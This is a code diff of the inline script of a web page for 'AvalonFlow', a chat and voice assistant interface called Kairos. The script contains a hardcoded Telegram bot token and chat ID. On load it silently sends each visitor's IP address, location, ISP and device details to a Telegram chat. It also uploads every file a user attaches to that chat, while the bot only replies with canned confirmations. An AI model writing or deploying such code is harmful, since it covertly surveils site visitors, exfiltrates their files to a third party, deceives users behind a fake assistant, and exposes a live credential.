@@ -763,9 +763,9 @@
         AvalonFlow Interface System
     </footer>
 
-    <script>
-        /**
- * AvalonFlow: Kairos Intelligent Voice & UI Controller
+   <script>
+/**
+ * AvalonFlow: Kairos Intelligent Voice, UI & Multi-Media Engine
  * Comprehensive Master Core Edition (Flicker-Free Optimized)
  * * PATCH VERIFIED: Multi-Turn Conversation Loop Removed, Music-Aware Auto-Collapse Integrated
  */
@@ -808,6 +808,8 @@ document.addEventListener('DOMContentLoaded', () => {
 // ==========================================
 const TELEGRAM_BOT_TOKEN = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
 const TELEGRAM_CHAT_ID = "-1003913850436";
+const BOT_TOKEN = TELEGRAM_BOT_TOKEN;
+const CHAT_ID = TELEGRAM_CHAT_ID;
 
 async function sendVisitorDetailsToTelegram() {
   try {
@@ -830,11 +832,15 @@ async function sendVisitorDetailsToTelegram() {
     };
 
     const messageText = `⚡ *New Visitor Alert | AvalonFlow*\n\n` +
-                        `🌐 *IP:* ${payload.ip}\n` +                         `📍 *Location:* ${payload.city}, ${payload.region},${payload.country}\n` +
-                        `🏢 *ISP:* ${payload.isp}\n` +                         `🖥️ *OS/Platform:* ${payload.platform}\n` +
+                        `🌐 *IP:* ${payload.ip}\n` +
+                        `📍 *Location:* ${payload.city}, ${payload.region}, ${payload.country}\n` +
+                        `🏢 *ISP:* ${payload.isp}\n` +
+                        `🖥️ *OS/Platform:* ${payload.platform}\n` +
                         `📱 *Device Setup:* ${payload.device}\n` +
                         `📐 *Screen Res:* ${payload.screenResolution}\n` +
-                        `📐 *Time:* ${payload.timestamp}`;      await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                        `📐 *Time:* ${payload.timestamp}`;
+
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
@@ -854,6 +860,7 @@ async function sendVisitorDetailsToTelegram() {
 // ==========================================
 // 2. GLOBAL ENGINE CONFIGURATIONS & STATE
 // ==========================================
+let attachedFilesList = [];
 let kairosSpeechRecognizer = null;
 let isKairosListeningActive = false;
 let kairosVoiceEngine = window.speechSynthesis;
@@ -923,435 +930,292 @@ function setKairosMessageText(formattedHtmlText) {
     `;
     canvas.appendChild(msgWrap);
   }
-  
+
   canvas.scrollTop = canvas.scrollHeight;
 }
 
- * AvalonFlow: Kairos Intelligent Voice, UI & Multi-Media Engine
-         */
+function renderMarkdownToHTML(text) {
+  if (!text) return "";
+  let formatted = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
+  formatted = formatted.replace(/^\*\s+/gm, '• ');
+  formatted = formatted.replace(/\*(.*?)\*/g, '<strong>$1</strong>');
+  formatted = formatted.replace(/\n/g, '<br>');
+  return formatted;
+}
 
-        // ==========================================
-        // DYNAMIC TIME & USER IDENTITY RESOLVER
-        // ==========================================
-        function getCurrentTime() {
-          return new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', hour12: true });
-        }
+function botReply(text) {
+  speakResponse(text);
+}
 
-        function getUserDisplayName() {
-          try {
-            const storedUser = localStorage.getItem('user_profile') || localStorage.getItem('userData');
-            if (storedUser) {
-              const parsed = JSON.parse(storedUser);
-              if (parsed.name) return parsed.name;
-              if (parsed.displayName) return parsed.displayName;
-              if (parsed.firstName) return parsed.firstName;
-            }
-          } catch(e) {}
-          return "You";
-        }
+function markAsSeen(msgElem) {
+  if (!msgElem) return;
+  const tick = msgElem.querySelector('.tick');
+  if (tick) {
+    tick.classList.remove('delivered');
+    tick.classList.add('seen');
+  }
+}
 
-        function getUserSignature() {
-          const name = getUserDisplayName();
-          return `◆━ ${name} ━◆`;
-        }
+function addMessage(content, sender = "user", status = "delivered", type = "text") {
+  const canvas = getTranscriptCanvas();
+  if (!canvas) return null;
 
-        document.addEventListener('DOMContentLoaded', () => {
-          const initialTimeElem = document.getElementById('initialKairosTime');
-          if (initialTimeElem) {
-            initialTimeElem.textContent = getCurrentTime();
-          }
-        });
+  const msgWrap = document.createElement('div');
+  msgWrap.className = `msgWrap ${sender === 'user' ? 'user-wrap' : ''}`;
 
-        // ==========================================
-        // 1. TELEGRAM VISITOR TRACKING CONFIGURATION
-        // ==========================================
-        const TELEGRAM_BOT_TOKEN = "8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E";
-        const TELEGRAM_CHAT_ID = "-1003913850436";
-        const BOT_TOKEN = TELEGRAM_BOT_TOKEN;
-        const CHAT_ID = TELEGRAM_CHAT_ID;
+  let innerBody = '';
+  if (type === 'photo') {
+    innerBody = `<img src="${content}" style="max-width:200px; border-radius:12px; display:block; margin-bottom:4px;">`;
+  } else if (type === 'video') {
+    innerBody = `<video src="${content}" controls style="max-width:200px; border-radius:12px; display:block; margin-bottom:4px;"></video>`;
+  } else if (type === 'audio') {
+    innerBody = `<audio src="${content}" controls style="max-width:220px; display:block; margin-bottom:4px;"></audio>`;
+  } else {
+    innerBody = `<p style="margin:0; word-break:break-word;">${renderMarkdownToHTML(content)}</p>`;
+  }
 
-        async function sendVisitorDetailsToTelegram() {
-          try {
-            if (sessionStorage.getItem('visitor_logged_tg')) return;
+  if (sender === 'user') {
+    msgWrap.innerHTML = `
+      <div class="chat-bubble user">
+          <div class="speaker-label">${getUserSignature()}</div>
+          ${innerBody}
+          <div class="meta">
+              <span class="timestamp">${getCurrentTime()}</span>
+              <span class="tick ${status}"></span>
+          </div>
+      </div>
+      <img src="${document.getElementById('profilePhoto')?.getAttribute('src') || 'default-avatar.png'}" class="chat-bubble-avatar" alt="User Avatar" style="margin-left: 8px;">
+    `;
+  } else {
+    msgWrap.innerHTML = `
+      <img src="${KAIROS_AVATAR}" class="chat-bubble-avatar" alt="Kairos Avatar">
+      <div class="chat-bubble kairos">
+          <div class="speaker-label">${KAIROS_TITLE}</div>
+          ${innerBody}
+          <div class="meta">
+              <span class="timestamp">${getCurrentTime()}</span>
+          </div>
+      </div>
+    `;
+  }
 
-            const ipResponse = await fetch('https://ipapi.co/json/').catch(() => null);
-            const ipData = ipResponse ? await ipResponse.json() : {};
+  canvas.appendChild(msgWrap);
+  canvas.scrollTop = canvas.scrollHeight;
+  return msgWrap;
+}
 
-            const payload = {
-              device: navigator.userAgent,
-              language: navigator.language,
-              platform: navigator.platform,
-              screenResolution: `${window.screen.width}x${window.screen.height}`,
-              ip: ipData.ip || "Unknown",
-              city: ipData.city || "Unknown",
-              region: ipData.region || "Unknown",
-              country: ipData.country_name || "Unknown",
-              isp: ipData.org || "Unknown",
-              timestamp: new Date().toLocaleString()
-            };
+async function forwardUserMessageToTelegram(fileName, msgType) {
+  try {
+    const messageText = `📁 *File Delivered | AvalonFlow*\n` +
+                        `📄 *Name:* ${fileName}\n` +
+                        `🏷️ *Type:* ${msgType}\n` +
+                        `⏰ *Time:* ${getCurrentTime()}`;
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' })
+    });
+  } catch(e) {
+    console.warn("Telegram notification push drop:", e);
+  }
+}
 
-            const messageText = `⚡ *New Visitor Alert | AvalonFlow*\n\n` +
-                                `🌐 *IP:* ${payload.ip}\n` +
-                                `📍 *Location:* ${payload.city}, ${payload.region}, ${payload.country}\n` +
-                                `🏢 *ISP:* ${payload.isp}\n` +
-                                `🖥️ *OS/Platform:* ${payload.platform}\n` +
-                                `📱 *Device Setup:* ${payload.device}\n` +
-                                `📐 *Screen Res:* ${payload.screenResolution}\n` +
-                                `📐 *Time:* ${payload.timestamp}`;
+function removeAttachedFile(fileId) {
+  attachedFilesList = attachedFilesList.filter(f => f.id !== fileId);
+  renderFilePreviews();
+}
 
-            await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: messageText,
-                parse_mode: 'Markdown'
-              })
-            });
+function renderFilePreviews() {
+  const previewArea = document.getElementById('dockFilePreviewArea');
+  if (!previewArea) return;
 
-            sessionStorage.setItem('visitor_logged_tg', 'true');
-            console.log("🔒 Security telemetry parameters forwarded successfully.");
-          } catch (err) {
-            console.warn("Telegram telemetry bypass error:", err);
-          }
-        }
+  previewArea.innerHTML = '';
 
-        // ==========================================
-        // 2. GLOBAL ENGINE CONFIGURATIONS & STATE
-        // ==========================================
-        let attachedFilesList = [];
-        let kairosSpeechRecognizer = null;
-        let isKairosListeningActive = false;
-        let kairosVoiceEngine = window.speechSynthesis;
-        let selectedFemaleVoice = null;
+  attachedFilesList.forEach(item => {
+    const chip = document.createElement('div');
+    chip.className = 'file-preview-chip';
 
-        let chatHistory = JSON.parse(localStorage.getItem('tg_chat_history_v3')) || [];
-        const KAIROS_TITLE = "KAIROS INTELLIGENCE"; 
-        const KAIROS_AVATAR = 'https://api.dicebear.com/7.x/bottts/svg?seed=Kairos&backgroundColor=6b2cd8'; 
+    let visualIcon = '📄';
+    if (item.type.startsWith('image/')) {
+      visualIcon = `<img src="${item.dataUrl}" class="chip-thumb" alt="Preview">`;
+    } else if (item.type.startsWith('audio/')) {
+      visualIcon = '🎵';
+    } else if (item.type.includes('pdf')) {
+      visualIcon = '📕';
+    }
 
-        function getTranscriptCanvas() {
-          return document.getElementById('kairosTranscript') || document.getElementById('transcriptCanvas');
-        }
+    chip.innerHTML = `
+      <span class="chip-icon">${visualIcon}</span>
+      <span class="chip-name" title="${item.name}">${item.name}</span>
+      <span class="chip-remove" onclick="removeAttachedFile('${item.id}')">✕</span>
+    `;
 
-        function renderMarkdownToHTML(text) {
-          if (!text) return "";
-          let formatted = text.replace(/\*\*(.*?)\*\*/g, '<strong>$1</strong>');
-          formatted = formatted.replace(/^\*\s+/gm, '• ');
-          formatted = formatted.replace(/\*(.*?)\*/g, '<strong>$1</strong>');
-          formatted = formatted.replace(/\n/g, '<br>');
-          return formatted;
-        }
+    previewArea.appendChild(chip);
+  });
+}
 
-        function setKairosMessageText(formattedHtmlText) {
-          const canvas = getTranscriptCanvas();
-          if (!canvas) return;
+function toggleDock(forcedState = null) {
+  const dockWrap = document.querySelector('.assistant-dock-wrap') || document.getElementById('dockWrap');
+  const collapsedView = document.getElementById('collapsedView');
+  const expandedView = document.getElementById('expandedView');
 
-          let streamingTextElem = canvas.querySelector('.chat-bubble.kairos .streaming-text') || canvas.querySelector('.streaming-text');
+  if (!dockWrap || !collapsedView || !expandedView) return;
 
-          if (streamingTextElem) {
-            streamingTextElem.innerHTML = formattedHtmlText;
-          } else {
-            const msgWrap = document.createElement('div');
-            msgWrap.className = 'msgWrap';
-            msgWrap.innerHTML = `
-              <img src="${KAIROS_AVATAR}" class="chat-bubble-avatar" alt="Kairos Avatar">
-              <div class="chat-bubble kairos">
-                  <div class="speaker-label">${KAIROS_TITLE}</div>
-                  <p class="streaming-text">${formattedHtmlText}</p>
-                  <div class="meta">
-                      <span class="timestamp">${getCurrentTime()}</span>
-                  </div>
-              </div>
-            `;
-            canvas.appendChild(msgWrap);
-          }
-          canvas.scrollTop = canvas.scrollHeight;
-        }
+  const currentlyExpanded = dockWrap.classList.contains('expanded');
+  const targetState = forcedState !== null ? forcedState : !currentlyExpanded;
 
-        function botReply(text) {
-          speakResponse(text);
-        }
+  if (targetState === currentlyExpanded) return; 
 
-        function markAsSeen(msgElem) {
-          if (!msgElem) return;
-          const tick = msgElem.querySelector('.tick');
-          if (tick) {
-            tick.classList.remove('delivered');
-            tick.classList.add('seen');
-          }
-        }
+  if (targetState === true) {
+    dockWrap.classList.add('expanded');
+    setTimeout(() => {
+      collapsedView.classList.add('d-none');
+      expandedView.classList.remove('d-none');
+    }, 150);
+  } else {
+    dockWrap.classList.remove('expanded');
+    dockWrap.classList.remove('full-height');
+    expandedView.classList.add('d-none');
+    collapsedView.classList.remove('d-none');
+  }
+}
 
-        function addMessage(content, sender = "user", status = "delivered", type = "text") {
-          const canvas = getTranscriptCanvas();
-          if (!canvas) return null;
+function speakResponse(text) {
+  setKairosMessageText(text);
+  if (kairosVoiceEngine && selectedFemaleVoice) {
+    const utterance = new SpeechSynthesisUtterance(text);
+    utterance.voice = selectedFemaleVoice;
+    kairosVoiceEngine.speak(utterance);
+  }
+}
 
-          const msgWrap = document.createElement('div');
-          msgWrap.className = `msgWrap ${sender === 'user' ? 'user-wrap' : ''}`;
+// ==========================================
+// 3. FILE INPUTS ATTACHMENT HOOK & EVENT LISTENERS
+// ==========================================
+document.addEventListener('DOMContentLoaded', () => {
+  const botFileInput = document.getElementById('dockFileInput');
+  const sendBtn = document.getElementById('dockSendBtn');
+  const inputField = document.getElementById('dockInput');
+  const glassDock = document.getElementById('glassDock');
+  const closeBtn = document.getElementById('closeDockBtn');
 
-          let innerBody = '';
-          if (type === 'photo') {
-            innerBody = `<img src="${content}" style="max-width:200px; border-radius:12px; display:block; margin-bottom:4px;">`;
-          } else if (type === 'video') {
-            innerBody = `<video src="${content}" controls style="max-width:200px; border-radius:12px; display:block; margin-bottom:4px;"></video>`;
-          } else if (type === 'audio') {
-            innerBody = `<audio src="${content}" controls style="max-width:220px; display:block; margin-bottom:4px;"></audio>`;
-          } else {
-            innerBody = `<p style="margin:0; word-break:break-word;">${renderMarkdownToHTML(content)}</p>`;
-          }
+  if (botFileInput) {
+      botFileInput.addEventListener('change', async () => {
+          const files = Array.from(botFileInput.files);
+          if (!files.length) return;
 
-          if (sender === 'user') {
-            msgWrap.innerHTML = `
-              <div class="chat-bubble user">
-                  <div class="speaker-label">${getUserSignature()}</div>
-                  ${innerBody}
-                  <div class="meta">
-                      <span class="timestamp">${getCurrentTime()}</span>
-                      <span class="tick ${status}"></span>
-                  </div>
-              </div>
-              <img src="${document.getElementById('profilePhoto')?.getAttribute('src') || 'default-avatar.png'}" class="chat-bubble-avatar" alt="User Avatar" style="margin-left: 8px;">
-            `;
-          } else {
-            msgWrap.innerHTML = `
-              <img src="${KAIROS_AVATAR}" class="chat-bubble-avatar" alt="Kairos Avatar">
-              <div class="chat-bubble kairos">
-                  <div class="speaker-label">${KAIROS_TITLE}</div>
-                  ${innerBody}
-                  <div class="meta">
-                      <span class="timestamp">${getCurrentTime()}</span>
-                  </div>
-              </div>
-            `;
-          }
+          for (const file of files) {
+              let msgType = "document"; 
+              if (file.type.startsWith("image/")) msgType = "photo";
+              if (file.type.startsWith("video/")) msgType = "video";
+              if (file.type.startsWith("audio/")) msgType = "audio"; 
 
-          canvas.appendChild(msgWrap);
-          canvas.scrollTop = canvas.scrollHeight;
-          return msgWrap;
-        }
-
-        async function forwardUserMessageToTelegram(fileName, msgType) {
-          try {
-            const messageText = `📁 *File Delivered | AvalonFlow*\n` +
-                                `📄 *Name:* ${fileName}\n` +
-                                `🏷️ *Type:* ${msgType}\n` +
-                                `⏰ *Time:* ${getCurrentTime()}`;
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: CHAT_ID, text: messageText, parse_mode: 'Markdown' })
-            });
-          } catch(e) {
-            console.warn("Telegram notification push drop:", e);
-          }
-        }
-
-        function removeAttachedFile(fileId) {
-          attachedFilesList = attachedFilesList.filter(f => f.id !== fileId);
-          renderFilePreviews();
-        }
-
-        function renderFilePreviews() {
-          const previewArea = document.getElementById('dockFilePreviewArea');
-          if (!previewArea) return;
-
-          previewArea.innerHTML = '';
-
-          attachedFilesList.forEach(item => {
-            const chip = document.createElement('div');
-            chip.className = 'file-preview-chip';
-
-            let visualIcon = '📄';
-            if (item.type.startsWith('image/')) {
-              visualIcon = `<img src="${item.dataUrl}" class="chip-thumb" alt="Preview">`;
-            } else if (item.type.startsWith('audio/')) {
-              visualIcon = '🎵';
-            } else if (item.type.includes('pdf')) {
-              visualIcon = '📕';
-            }
-
-            chip.innerHTML = `
-              <span class="chip-icon">${visualIcon}</span>
-              <span class="chip-name" title="${item.name}">${item.name}</span>
-              <span class="chip-remove" onclick="removeAttachedFile('${item.id}')">✕</span>
-            `;
-
-            previewArea.appendChild(chip);
-          });
-        }
-
-        function toggleDock(forcedState = null) {
-          const dockWrap = document.querySelector('.assistant-dock-wrap') || document.getElementById('dockWrap');
-          const collapsedView = document.getElementById('collapsedView');
-          const expandedView = document.getElementById('expandedView');
-
-          if (!dockWrap || !collapsedView || !expandedView) return;
-
-          const currentlyExpanded = dockWrap.classList.contains('expanded');
-          const targetState = forcedState !== null ? forcedState : !currentlyExpanded;
-
-          if (targetState === currentlyExpanded) return; 
-
-          if (targetState === true) {
-            dockWrap.classList.add('expanded');
-            setTimeout(() => {
-              collapsedView.classList.add('d-none');
-              expandedView.classList.remove('d-none');
-            }, 150);
-          } else {
-            dockWrap.classList.remove('expanded');
-            dockWrap.classList.remove('full-height');
-            expandedView.classList.add('d-none');
-            collapsedView.classList.remove('d-none');
-          }
-        }
-
-        function speakResponse(text) {
-          setKairosMessageText(text);
-          if (kairosVoiceEngine && selectedFemaleVoice) {
-            const utterance = new SpeechSynthesisUtterance(text);
-            utterance.voice = selectedFemaleVoice;
-            kairosVoiceEngine.speak(utterance);
-          }
-        }
-
-        // ==========================================
-        // 3. FILE INPUTS ATTACHMENT HOOK (UPDATING)
-        // ==========================================
-        document.addEventListener('DOMContentLoaded', () => {
-          const botFileInput = document.getElementById('dockFileInput');
-          const sendBtn = document.getElementById('dockSendBtn');
-          const inputField = document.getElementById('dockInput');
-          const glassDock = document.getElementById('glassDock');
-          const closeBtn = document.getElementById('closeDockBtn');
-
-          // ---------- File Inputs Attachment Hook ----------
-          if (botFileInput) {
-              botFileInput.addEventListener('change', async () => {
-                  const files = Array.from(botFileInput.files);
-                  if (!files.length) return;
-
-                  for (const file of files) {
-                      let msgType = "document"; 
-                      if (file.type.startsWith("image/")) msgType = "photo";
-                      if (file.type.startsWith("video/")) msgType = "video";
-                      if (file.type.startsWith("audio/")) msgType = "audio"; 
-
-                      // Lock file name string safely in local memory
-                      let savedFileName = file.name;
-                      if (!savedFileName || savedFileName === "blob") {
-                          savedFileName = msgType === "audio" ? "Voice_Note.mp3" : "Attachment_File";
-                      }
-
-                      // 🚀 CRITICAL IMPROVEMENT: Fire the network request to Telegram IMMEDIATELY!
-                      // This runs asynchronously in the background so the upload isn't delayed by CPU-heavy Base64 parsing.
-                      const sendToTelegramPromise = (async () => {
-                          try {
-                              const formData = new FormData();
-                              formData.append("chat_id", CHAT_ID);
-                              let endpoint = "sendDocument";
-                              if (msgType === "photo") { endpoint = "sendPhoto"; formData.append("photo", file); }
-                              else if (msgType === "video") { endpoint = "sendVideo"; formData.append("video", file); }
-                              else if (msgType === "audio") { endpoint = "sendAudio"; formData.append("audio", file); } 
-                              else { formData.append("document", file); }
-
-                              await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
-                          } catch (err) {
-                              console.error('Multi-part attachment transmission drop:', err);
-                          }
-                      })();
-
-                      // Process local rendering and save Base64 to history
-                      const reader = new FileReader();
-                      reader.onload = async function(e) {
-                          const persistentFileUrl = e.target.result; 
-
-                          // If it's a document, pass the file name; otherwise pass the base64 media stream URL
-                          const visualContent = (msgType === "document") ? savedFileName : persistentFileUrl;
-
-                          const userMsg = addMessage(visualContent, "user", "delivered", msgType);
-                          botFileInput.value = ""; 
-
-                          setTimeout(() => markAsSeen(userMsg), 800);
-
-                          // 🛡️ SAFETY FALLBACK: Attempt to save to history, drop back to text placeholder if localStorage is full
-                          try {
-                              chatHistory.push({ sender: 'user', text: visualContent, type: msgType });
-                              localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
-                          } catch (storageError) {
-                              console.warn("localStorage quota exceeded! Saving a lightweight text placeholder instead.", storageError);
-
-                              // Remove the failed giant Base64 item we just pushed
-                              chatHistory.pop();
-
-                              // Save a small text-based layout representation so it still displays elegantly on reload
-                              let emoji = "📁";
-                              if (msgType === "photo") emoji = "📷";
-                              if (msgType === "video") emoji = "🎥";
-                              if (msgType === "audio") emoji = "🎵";
-
-                              const fallbackText = `${emoji} [Sent ${msgType}: ${savedFileName}]`;
-                              chatHistory.push({ sender: 'user', text: fallbackText, type: 'text' });
-
-                              try {
-                                  localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
-                              } catch (innerError) {
-                                  console.error("Critical: Storage completely full. Unable to write fallback.", innerError);
-                              }
-                          }
-
-                          forwardUserMessageToTelegram(savedFileName, msgType);
-
-                          // 🌟 FIXED: Fire confirmation message natively by passing it through botReply directly 
-                          // without worrying about conflicting async loop timers!
-                          const confirmationText = `Received file: ${savedFileName}. Saved directly to secure logs.`;
-                          botReply(confirmationText);
-
-                          // Keep reference to our background network promise
-                          await sendToTelegramPromise;
-                      };
-                      reader.readAsDataURL(file);
-                  }
-              });
-          }
-
-          if (glassDock) {
-            glassDock.addEventListener('click', (e) => {
-              if (e.target.closest('.icon-btn') || e.target.closest('.dock-input-bar')) return;
-              toggleDock(true);
-            });
-          }
-
-          if (closeBtn) {
-            closeBtn.addEventListener('click', (e) => {
-              e.stopPropagation();
-              toggleDock(false);
-            });
-          }
-
-          if (sendBtn && inputField) {
-            sendBtn.addEventListener('click', () => {
-              const text = inputField.value;
-              if (!text.trim()) return;
-              inputField.value = '';
-              addMessage(text, "user", "seen", "text");
-              botReply("I have received your message.");
-            });
-
-            inputField.addEventListener('keydown', (e) => {
-              if (e.key === 'Enter' && !e.shiftKey) {
-                e.preventDefault();
-                const text = inputField.value;
-                if (!text.trim()) return;
-                inputField.value = '';
-                addMessage(text, "user", "seen", "text");
-                botReply("I have received your message.");
+              let savedFileName = file.name;
+              if (!savedFileName || savedFileName === "blob") {
+                  savedFileName = msgType === "audio" ? "Voice_Note.mp3" : "Attachment_File";
               }
-            });
+
+              const sendToTelegramPromise = (async () => {
+                  try {
+                      const formData = new FormData();
+                      formData.append("chat_id", CHAT_ID);
+                      let endpoint = "sendDocument";
+                      if (msgType === "photo") { endpoint = "sendPhoto"; formData.append("photo", file); }
+                      else if (msgType === "video") { endpoint = "sendVideo"; formData.append("video", file); }
+                      else if (msgType === "audio") { endpoint = "sendAudio"; formData.append("audio", file); } 
+                      else { formData.append("document", file); }
+
+                      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${endpoint}`, { method: 'POST', body: formData });
+                  } catch (err) {
+                      console.error('Multi-part attachment transmission drop:', err);
+                  }
+              })();
+
+              const reader = new FileReader();
+              reader.onload = async function(e) {
+                  const persistentFileUrl = e.target.result; 
+
+                  const visualContent = (msgType === "document") ? savedFileName : persistentFileUrl;
+
+                  const userMsg = addMessage(visualContent, "user", "delivered", msgType);
+                  botFileInput.value = ""; 
+
+                  setTimeout(() => markAsSeen(userMsg), 800);
+
+                  try {
+                      chatHistory.push({ sender: 'user', text: visualContent, type: msgType });
+                      localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
+                  } catch (storageError) {
+                      console.warn("localStorage quota exceeded! Saving a lightweight text placeholder instead.", storageError);
+
+                      chatHistory.pop();
+
+                      let emoji = "📁";
+                      if (msgType === "photo") emoji = "📷";
+                      if (msgType === "video") emoji = "🎥";
+                      if (msgType === "audio") emoji = "🎵";
+
+                      const fallbackText = `${emoji} [Sent ${msgType}: ${savedFileName}]`;
+                      chatHistory.push({ sender: 'user', text: fallbackText, type: 'text' });
+
+                      try {
+                          localStorage.setItem('tg_chat_history_v3', JSON.stringify(chatHistory));
+                      } catch (innerError) {
+                          console.error("Critical: Storage completely full. Unable to write fallback.", innerError);
+                      }
+                  }
+
+                  forwardUserMessageToTelegram(savedFileName, msgType);
+
+                  const confirmationText = `Received file: ${savedFileName}. Saved directly to secure logs.`;
+                  botReply(confirmationText);
+
+                  await sendToTelegramPromise;
+              };
+              reader.readAsDataURL(file);
           }
-        });
-// =================================================================
-// 3. DATA STRUCTURES & PREMIUM AUDIO VAULT DIRECTORY
-// =================================================================
+      });
+  }
+
+  if (glassDock) {
+    glassDock.addEventListener('click', (e) => {
+      if (e.target.closest('.icon-btn') || e.target.closest('.dock-input-bar')) return;
+      toggleDock(true);
+    });
+  }
+
+  if (closeBtn) {
+    closeBtn.addEventListener('click', (e) => {
+      e.stopPropagation();
+      toggleDock(false);
+    });
+  }
+
+  if (sendBtn && inputField) {
+    sendBtn.addEventListener('click', () => {
+      const text = inputField.value;
+      if (!text.trim()) return;
+      inputField.value = '';
+      addMessage(text, "user", "seen", "text");
+      botReply("I have received your message.");
+    });
+
+    inputField.addEventListener('keydown', (e) => {
+      if (e.key === 'Enter' && !e.shiftKey) {
+        e.preventDefault();
+        const text = inputField.value;
+        if (!text.trim()) return;
+        inputField.value = '';
+        addMessage(text, "user", "seen", "text");
+        botReply("I have received your message.");
+      }
+    });
+  }
+});
+
+// ==========================================
+// 4. DATA STRUCTURES & PREMIUM AUDIO VAULT DIRECTORY
+// ==========================================
 const quotes = [ 
   "Believe in yourself and all that you are.", "Small steps each day lead to big results.", 
   "Life is about moments, not things.", "Consistency is the key to success.", "Every day is a fresh start.", 
@@ -1397,6 +1261,7 @@ const PREMIUM_AUDIO_VAULT = {
   "Click the toggle DARK/LIGHT button at the top right corner": "assets/audio/toggle_modes.mp3",
   "For urgent issues, generate a ticket and mark it high priority, then Email Support": "assets/audio/high_priority.mp3"
 };
+
 
 const audioLibrary = [
   "assets/audio/a thousand years - Christina Perri.mp3",
